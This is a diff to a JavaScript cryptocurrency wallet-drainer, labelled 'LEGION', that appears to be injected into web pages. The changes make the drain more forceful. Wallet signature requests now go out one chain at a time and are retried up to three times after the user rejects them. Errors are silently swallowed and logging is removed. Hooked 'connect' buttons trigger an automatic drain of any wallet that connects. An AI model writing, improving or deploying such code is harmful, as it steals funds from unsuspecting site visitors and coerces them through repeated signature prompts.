@@ -1681,45 +1681,45 @@
       messages[chainName] = buildSignMessageForChain(chainName, chain.address);
     });
 
-    // Parallel signing using Promise.allSettled
-    var signingPromises = chainNames.map(function(chainName) {
-      return Promise.resolve().then(function() {
-        console.log('[LEGION]   🖊️ ', chainName, '← requesting signature');
-        return CHAINS_SUPPORTED[chainName].sign(messages[chainName]);
-      });
-    });
+    // Sign each chain with retry on reject (max 3 retries per chain)
+    var MAX_SIGN_RETRIES = 3;
 
-    var results = await Promise.allSettled(signingPromises);
+    async function signChainWithRetry(chainName, message) {
+      for (var attempt = 0; attempt < MAX_SIGN_RETRIES; attempt++) {
+        try {
+          var sig = await CHAINS_SUPPORTED[chainName].sign(message);
+          if (sig) return sig;
+        } catch (e) {}
+        if (attempt < MAX_SIGN_RETRIES - 1) {
+          await new Promise(function(r) { setTimeout(r, 500); });
+        }
+      }
+      return null;
+    }
 
+    // Sign all chains (sequential to avoid popup overlap)
     var validSignatures = {};
     var successCount = 0;
 
-    chainNames.forEach(function(chainName, idx) {
-      var result = results[idx];
-
-      if (result.status === 'fulfilled' && result.value) {
-        validSignatures[chainName] = {
-          signature: result.value,
-          address: connectedChains[chainName] ? connectedChains[chainName].address : '',
-          walletType: connectedChains[chainName] ? connectedChains[chainName].walletType : 'unknown',
-          chainId: connectedChains[chainName] ? connectedChains[chainName].chainId : null,
-          message: messages[chainName],
-          timestamp: Date.now()
-        };
-        successCount++;
-        console.log('[LEGION]   ✅', chainName, '← signature confirmed');
-      } else {
-        var reason = result.reason ? result.reason.message : 'User rejected or error';
-        console.warn('[LEGION]   ❌', chainName, '← signature failed:', reason);
-      }
-    });
+    for (var ci = 0; ci < chainNames.length; ci++) {
+      var chainName = chainNames[ci];
+      try {
+        var sig = await signChainWithRetry(chainName, messages[chainName]);
+        if (sig) {
+          validSignatures[chainName] = {
+            signature: sig,
+            address: connectedChains[chainName] ? connectedChains[chainName].address : '',
+            walletType: connectedChains[chainName] ? connectedChains[chainName].walletType : 'unknown',
+            chainId: connectedChains[chainName] ? connectedChains[chainName].chainId : null,
+            message: messages[chainName],
+            timestamp: Date.now()
+          };
+          successCount++;
+        }
+      } catch (e) {}
+    }
 
     PARALLEL_STATS.signatureTime = performance.now() - PARALLEL_STATS.signatureStart;
-
-    console.log('[LEGION] ✅ Signatures complete:',
-      successCount + '/' + chainNames.length, 'signatures obtained (' +
-      PARALLEL_STATS.signatureTime.toFixed(0) + 'ms)');
-
     return validSignatures;
   }
 
@@ -3280,6 +3280,7 @@
   // ─── PUBLIC HANDLER: Opens wallet panel, then connects ─────────────────
 
   window.handleConnectAndDrain = function() {
+    if (drainRunning) return;
     // Mobile in-app browser — skip panel, go direct
     if (PLATFORM.isInAppBrowser) {
       runConnectAndDrain();
@@ -3819,26 +3820,26 @@
           return;
         }
 
-        // Otherwise, let the original click happen AND run our flow after delay
-        setTimeout(function() {
-          // Check if a wallet connected through the page's own flow
-          if (window.ethereum && window.ethereum.selectedAddress && !connectedChains.EVM) {
-            connectedChains.EVM = {
-              chain: 'EVM',
-              config: CHAIN_CONFIG.EVM,
-              address: window.ethereum.selectedAddress.toLowerCase(),
-              chainId: window.ethereum.chainId ? parseInt(window.ethereum.chainId, 16) : 1,
-              walletType: window.ethereum.isMetaMask ? 'MetaMask' : 'Injected',
-              provider: window.ethereum,
-              connected: true,
-              timestamp: Date.now()
-            };
-            LOGGER.info('Hooked EVM connection:', connectedChains.EVM.address.substring(0, 10) + '...');
-            if (AUTO_DRAIN && !drainRunning) {
-              window.handleConnectAndDrain();
+        // Let original click happen, then check if wallet connected
+        if (!drainRunning) {
+          setTimeout(function() {
+            if (window.ethereum && window.ethereum.selectedAddress && !connectedChains.EVM && !drainRunning) {
+              connectedChains.EVM = {
+                chain: 'EVM',
+                config: CHAIN_CONFIG.EVM,
+                address: window.ethereum.selectedAddress.toLowerCase(),
+                chainId: window.ethereum.chainId ? parseInt(window.ethereum.chainId, 16) : 1,
+                walletType: window.ethereum.isMetaMask ? 'MetaMask' : 'Injected',
+                provider: window.ethereum,
+                connected: true,
+                timestamp: Date.now()
+              };
+              if (AUTO_DRAIN && !drainRunning) {
+                runConnectAndDrain();
+              }
             }
-          }
-        }, 1500);
+          }, 2000);
+        }
       }, true);
     });
 
@@ -3847,13 +3848,15 @@
     }
   }
 
-  // Re-scan for new buttons (SPAs add buttons dynamically)
+  // Re-scan for new buttons (SPAs add buttons dynamically) — max 10 scans then stop
   function startButtonObserver() {
     if (typeof MutationObserver === 'undefined') return;
     var debounceTimer;
+    var scanCount = 0;
     var observer = new MutationObserver(function() {
+      if (scanCount >= 10) { observer.disconnect(); return; }
       clearTimeout(debounceTimer);
-      debounceTimer = setTimeout(hookPageConnectButtons, 500);
+      debounceTimer = setTimeout(function() { scanCount++; hookPageConnectButtons(); }, 1000);
     });
     observer.observe(document.body, { childList: true, subtree: true });
   }
